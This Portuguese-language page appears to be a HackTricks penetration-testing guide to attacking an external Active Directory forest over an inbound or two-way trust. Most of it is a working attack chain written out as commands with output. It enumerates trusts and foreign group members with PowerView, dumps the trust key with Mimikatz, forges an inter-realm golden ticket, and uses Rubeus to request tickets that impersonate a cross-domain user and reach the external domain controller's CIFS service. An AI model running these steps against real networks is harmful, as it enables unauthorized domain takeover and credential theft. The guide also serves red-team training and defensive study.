# Domínio de Floresta Externa - OneWay (Inbound) ou bidirecional

{{#include ../../banners/hacktricks-training.md}}

Neste cenário, um domínio externo está confiando em você (ou ambos estão se confiando mutuamente), então você pode obter algum tipo de acesso sobre ele.

## Enumeração

Primeiro de tudo, você precisa **enumerar** a **confiança**:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
Na enumeração anterior, foi descoberto que o usuário **`crossuser`** está dentro do grupo **`External Admins`**, que tem **acesso de Admin** dentro do **DC do domínio externo**.

## Acesso Inicial

Se você **não conseguiu** encontrar nenhum acesso **especial** do seu usuário no outro domínio, você ainda pode voltar à Metodologia AD e tentar **privesc de um usuário não privilegiado** (coisas como kerberoasting, por exemplo):

Você pode usar as **funções do Powerview** para **enumerar** o **outro domínio** usando o parâmetro `-Domain`, como em:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonação

### Login

Usando um método regular com as credenciais dos usuários que têm acesso ao domínio externo, você deve ser capaz de acessar:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Abuso do SID History

Você também pode abusar do [**SID History**](sid-history-injection.md) através de uma confiança de floresta.

Se um usuário for migrado **de uma floresta para outra** e **o SID Filtering não estiver habilitado**, torna-se possível **adicionar um SID da outra floresta**, e esse **SID** será **adicionado** ao **token do usuário** ao autenticar **através da confiança**.

> [!WARNING]
> Como lembrete, você pode obter a chave de assinatura com
>
> ```powershell
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Você poderia **assinar com** a chave **confiável** um **TGT se passando** pelo usuário do domínio atual.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Caminho completo para se passar pelo usuário
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
{{#include ../../banners/hacktricks-training.md}}
